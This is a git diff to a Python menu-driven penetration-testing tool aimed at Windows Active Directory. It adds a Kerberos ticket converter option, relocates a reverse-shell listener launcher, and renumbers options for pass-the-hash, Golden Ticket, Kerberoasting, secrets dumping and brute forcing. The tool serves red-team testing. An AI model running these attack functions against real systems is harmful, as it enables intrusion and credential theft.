@@ -816,21 +816,21 @@ def dispMenu():
 
 # DISPLAY MENU   
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Kerb Ticket (71) ServScanner (81) GRP Scanner (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DigDNS (600) HTTP GitDumper (700) CertVULN (710) Certipy10" + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Silv Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Enum  DOMAIN (601) LAPS    Dumper (701) Certipy1 (711) Certipy11" + '\u2551')      
-   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Recon DOMAIN (602) Secrets   Dump (702) Certipy2 (712) Certipy12" + '\u2551')   
-   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Enum Sub-DOM (603) Crack-Map-Dump (703) Certipy3 (713) Certipy13" + '\u2551')
-   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set KERB AUTH (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) Domain    Dump (704) Certipy4 (714) Certipy14" + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16)                  (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodHoundDump (705) Certipy5 (715) Certipy15" + '\u2551')
-   print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy6 (716) Certipy16" + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) BloodyADdGroup (707) Certipy7 (717) Certipy17" + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69) Set Servers (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) ReactivateUser (708) Certipy8 (718) BHoundGUI" + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux    (70) SetRevShell (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) RunLineCommand  (350) LFI     Wordlist (450)", end= ' ')
+   print('\u2551' + "(01) Set O/S  FORMAT (11) Set DOMAIN SID (31) Get Arch (41) WinLDAP Search (51) Kerberos  Info (61) Kerb  Ticket (71) ServScanner (81) GRP Scanner (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DigDNS (600) LAPS    Dumper (700) Cert VULN (710) Certipy 10 " + '\u2551')   
+   print('\u2551' + "(02) Set DNS ADDRESS (12) Set SUB-DOMAIN (32) Net View (42) Lookup Sec IDs (52) Kerberos  Auth (62) Silv  Ticket (72) VulnScanner (82) GRP  SHARES (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Enum  DOMAIN (601) Secrets Dumper (701) Certipy 1 (711) Certipy 11 " + '\u2551')      
+   print('\u2551' + "(03) Set IP  ADDRESS (13) Set FILE  NAME (33) Services (43) Sam Dump Users (53) Kerberos Brute (63) Gold  Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Recon DOMAIN (602) Crack-Map-Dump (702) Certipy 2 (712) Certipy 12 " + '\u2551')   
+   print('\u2551' + "(04) Set LIVE  PORTS (14) Set SHARE NAME (34) AT  Exec (44) REGistry Hives (54) Kerbe Roasting (64) Gold  DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Enum Sub-DOM (603) Domain  Dumper (703) Certipy 3 (713) Certipy 13 " + '\u2551')
+   print('\u2551' + "(05) Set WEBSITE URL (15) Set KERB  AUTH (35) DComExec (45) Enum EndPoints (55) ASREP Roasting (65) HASH2TICKET  (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) EnumVirtHOST (604) BloodHoundDump (704) Certipy 4 (714) Certipy 14 " + '\u2551')
+   print('\u2551' + "(06) Set USER   NAME (16)                (36) PS  Exec (46) Rpc ClientServ (56) TARGD Roasting (66) Disp  Ticket (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodyADd User (705) Certipy 5 (715) Certipy 15 " + '\u2551')
+   print('\u2551' + "(07) Set PASS   WORD (17) Set SERVERTIME (37) SMB Exec (47) Smb ClientServ (57) Pass the  HASH (67) PSExec  HASH (77) SNMP Walker (87)             (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADdGroup (706) Certipy 6 (716) Certipy 16 " + '\u2551')
+   print('\u2551' + "(08) Set NTLM   HASH (28) Set  COMMUNITY (38) WMI Exec (48) Smb Map SHARES (58) Over Pass HASH (68) SmbExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) ReactivateUser (707) Certipy 7 (717) Certipy 17 " + '\u2551')
+   print('\u2551' + "(09) Set TICKET NAME (29) Set FUZZ RIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH  (69) WmiExec HASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) BloodHound GUI (708) Certipy 8 (718)            " + '\u2551')
+   print('\u2551' + "(10) Set DOMAIN NAME (30) Set WORD  LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux     (70) STARTSERVERS (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) Run LineCommand (350) HTTP Git  Dumper (450)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName.rstrip(" "), end= ' ')
-   print("(609)                (709) Certipy9 (719) ADMineGUI" + '\u2551')
+   print("(609) AD Miner   GUI (709) Certipy 9 (719) RemoteShell" + '\u2551')
    print('\u255A' + '\u2550'*280 + '\u255D')
    return
    
@@ -2859,11 +2859,30 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
+# Details : Menu option selected - HASH 2 TICKET
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='65':
+      userAD = input("[?] Please enter the AD username: ")   
+      hashTicket = input("[?] Please enter the hash value: ")
+      localCOM("echo " + hashTicket + " > " + userAD + ".kirbi") 
+      localCOM("cat " + userAD + ".kirbi | tr -d '\n' | base64 -d > " + userAD + "_raw.kirbi")
+      localCOM("impacket-ticketConverter " + userAD + "_raw.kirbi " + userAD + ".ccache")
+      print("[i] Type this command into anther console windows....\n")
+      print("export KRB5CCNAME=$PWD/" + userAD + ".ccache")
+      TGT = spacePadding(userAD + ".ccache", COL1)
+      prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
 # Details : Menu option selected - Describe Ticket
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '65':
+   if selection == '66':
       localCOM(keyPath + "describeTicket.py " + TGT.rstrip(" ") + " > ticket.tmp")
       catsFile("ticket.tmp")
       prompt() 
@@ -2876,7 +2895,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='66':
+   if selection =='67':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -2893,7 +2912,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='67':
+   if selection =='68':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -2910,7 +2929,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='68':
+   if selection =='69':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()         
@@ -2927,7 +2946,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '69':
+   if selection == '70':
       dispSubMenu(" (01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server (05) SMTPD Server (06) NCAT Server (07) Responder (08) Quit")
       checkParam = 0
       subChoice = input("[?] Please select an option: ")
@@ -2973,28 +2992,6 @@ while True:
             localCOM("xdotool type '" + choice + "'; xdotool key Return")
             localCOM("xdotool key Ctrl+Tab")         
       prompt()    
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Start a Reverse Shell
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '70':
-      portChoice = input("[?] Please select a port number: ")
-      if portChoice.isnumeric():
-         print(colored("[*] Specified local service started...", colour3))
-         localCOM("xdotool key Ctrl+Shift+T")
-         localCOM("xdotool key Alt+Shift+S; xdotool type 'REVERSE SHELL'; xdotool key Return")
-         dispBanner("REVERSE SHELL",0) 
-         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-         localCOM("xdotool type 'python3 ./" + explDir + "/shell.py '" + portChoice + "; xdotool key Return")
-         localCOM("xdotool key Ctrl+Tab")
-      else:
-         pass
-      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4281,31 +4278,16 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - LFI CHECK
+# Details : Menu option selected git-dumper URL DIR
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '350':
-      checkParams = test_WEB()
-      os.chdir(workDir)
-      if checkParams != 1:
-         print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
-         file1 = open("." + currentWordlist.rstrip(" "), 'r')
-         Lines = file1.readlines()
-         for line in Lines:
-            file = line.replace("/","-")
-            file = file.replace("\\","-")
-            file = file.replace(" ","_")
-            file = file.rstrip("\n")
-            ffile = "file" + file
-            remoteCOM("wget -q -O " + ffile + " " + WEB + line)
-            if os.stat(ffile).st_size == 0:
-               remoteCOM("rm " + ffile)
-            else:
-               print ("[!] Found file " + WEB + line.rstrip("\n") + "...")
-         print("[+] Completed...")   
-         remoteCOM("cd ..")
-      prompt()  
+      checkParam = test_WEB()
+      if checkParam != 1:
+         print(colored("[*] Dumping the git repositiry, please wait...", colour3))
+         remoteCOM("git-dumper '" + WEB.rstrip(" ") + "' " + workDir)         
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4526,28 +4508,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected git-dumper URL DIR
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '600':
-      checkParam = test_WEB()
-      if checkParam != 1:
-         print(colored("[*] Dumping the git repositiry, please wait...", colour3))
-         remoteCOM("git-dumper '" + WEB.rstrip(" ") + "' " + workDir)         
-      prompt() 
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
 # Version : TREADSTONE
 # Details : Menu option selected - Laps Dumper
 # Details : OLD CODE- aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='601':
+   if selection =='600':
       checkParam != test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()  
@@ -4578,7 +4545,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='602':
+   if selection =='601':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -4635,7 +4602,7 @@ while True:
 # Modified: crackmapexec currently (03/01/2021) has a python3 problem - so this is a work around that still does not terminate properly.
 # -------------------------------------------------------------------------------------
 
-   if selection =='603':
+   if selection =='602':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -4701,7 +4668,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='604':
+   if selection =='603':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()               
@@ -4723,7 +4690,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='605':
+   if selection =='604':
       checkParam = test_TIP()      
       if checkParam != 1:
          checkParam = test_DOM()                     
@@ -4753,7 +4720,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '606':
+   if selection == '605':
       AD1 = input("[?] Please enter new users name: ")
       AD2 = input("[?] Please enter new users password: ")
       SKEW = timeSync(SKEW)
@@ -4778,7 +4745,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '607':
+   if selection == '606':
       AD1 = input("[?] Please enter new group name: ")
       SKEW = timeSync(SKEW)
       localCOM("bloodyAD --host " + TIP.rstrip("") + " -d " + DOM.rstrip("") + " -u " + USR.rstrip("") + "  -p " + PAS.rstrip("") + " add groupMember '" + AD1.rstrip("") + "' " + USR.rstrip(""))
@@ -4801,7 +4768,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '608':
+   if selection == '607':
       AD1 = input("[?] Please enter account user's name: ").strip()
       SKEW = timeSync(SKEW)
       print(colored("[*] Checking current account status...", colour3)) 
@@ -4889,6 +4856,44 @@ while True:
          print(f"[-] An unexpected error occurred: {e}")
       TIP = BAK
       prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Bloodhound Community GUI
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '608':
+      print(colored("[*] Starting Bloodhound Community GUI...", colour3))         
+      localCOM("xdotool key Ctrl+Shift+T")
+      localCOM("xdotool key Alt+Shift+S; xdotool type 'BLOODHOUND GUI'; xdotool key Return")
+      dispBanner("BLOODHOUND GUI",0) 
+      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      localCOM("xdotool type '/usr/local/bin/Bloodhound/bloodhound-cli up'; xdotool key Return")
+      localCOM("xdotool type 'firefox http://localhost:8080'; xdotool key Return")
+      localCOM("xdotool key Ctrl+Tab") 
+      prompt()  
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - AD-Miner GUI
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '609':
+      print(colored("[*] Starting AD-Miner GUI...", colour3))         
+      localCOM("xdotool key Ctrl+Shift+T")
+      localCOM("xdotool key Alt+Shift+S; xdotool type 'AD-MINER GUI'; xdotool key Return")
+      dispBanner("BLOODHOUND GUI",0) 
+      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      localCOM("xdotool type 'AD-miner -c -cf My_Report -u neo4j -p bloodhoundcommunityedition -b bolt://localhost:7687 --evolution EVOLUTION'; xdotool key Return")
+      localCOM("xdotool type 'firefox ./My_Report/index.html'; xdotool key Return")
+      localCOM("xdotool key Ctrl+Tab") 
+      prompt()       
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5192,44 +5197,28 @@ while True:
    if selection =='717':
       print("[!] ESC17 - Orphaned Enrollment Agent Templates: Enrollment Agent templates still usable even if removed from CA config — persistence risk...\n") 
       SKEW = timeSync(SKEW)
-      prompt()         
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Bloodhound Community GUI
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '718':
-      print(colored("[*] Starting Bloodhound Community GUI...", colour3))         
-      localCOM("xdotool key Ctrl+Shift+T")
-      localCOM("xdotool key Alt+Shift+S; xdotool type 'BLOODHOUND GUI'; xdotool key Return")
-      dispBanner("BLOODHOUND GUI",0) 
-      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-      localCOM("xdotool type '/usr/local/bin/Bloodhound/bloodhound-cli up'; xdotool key Return")
-      localCOM("xdotool type 'firefox http://localhost:8080'; xdotool key Return")
-      localCOM("xdotool key Ctrl+Tab") 
-      prompt()   
+      prompt()      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - AD-Miner GUI
+# Details : Menu option selected - Start a Reverse Shell
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '719':
-      print(colored("[*] Starting AD-Miner GUI...", colour3))         
-      localCOM("xdotool key Ctrl+Shift+T")
-      localCOM("xdotool key Alt+Shift+S; xdotool type 'AD-MINER GUI'; xdotool key Return")
-      dispBanner("BLOODHOUND GUI",0) 
-      localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-      localCOM("xdotool type 'AD-miner -c -cf My_Report -u neo4j -p bloodhoundcommunityedition -b bolt://localhost:7687 --evolution EVOLUTION'; xdotool key Return")
-      localCOM("xdotool type 'firefox ./My_Report/index.html'; xdotool key Return")
-      localCOM("xdotool key Ctrl+Tab") 
-      prompt()         
+      portChoice = input("[?] Please select a port number: ")
+      if portChoice.isnumeric():
+         print(colored("[*] Specified local service started...", colour3))
+         localCOM("xdotool key Ctrl+Shift+T")
+         localCOM("xdotool key Alt+Shift+S; xdotool type 'REVERSE SHELL'; xdotool key Return")
+         dispBanner("REVERSE SHELL",0) 
+         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+         localCOM("xdotool type 'python3 ./" + explDir + "/shell.py '" + portChoice + "; xdotool key Return")
+         localCOM("xdotool key Ctrl+Tab")
+      else:
+         pass
+      prompt()        
                
 # Eof...
